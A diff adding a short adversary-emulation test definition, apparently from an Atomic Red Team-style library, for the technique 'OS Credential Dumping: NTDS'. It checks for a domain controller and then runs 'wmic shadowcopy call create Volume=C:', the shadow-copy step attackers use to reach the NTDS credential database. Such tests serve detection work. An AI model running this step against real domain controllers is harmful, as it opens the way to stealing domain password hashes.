@@ -1,0 +1,15 @@
+#TechniqueName: OS Credential Dumping: NTDS
+#AtomicTestName: Create Volume Shadow Copy with WMI
+#Language: cmd
+
+#get_prereq_commands
+echo Sorry, Promoting this machine to a Domain Controller must be done manually
+
+
+#prereq_commands
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+
+
+#commands
+wmic shadowcopy call create Volume=C:
+
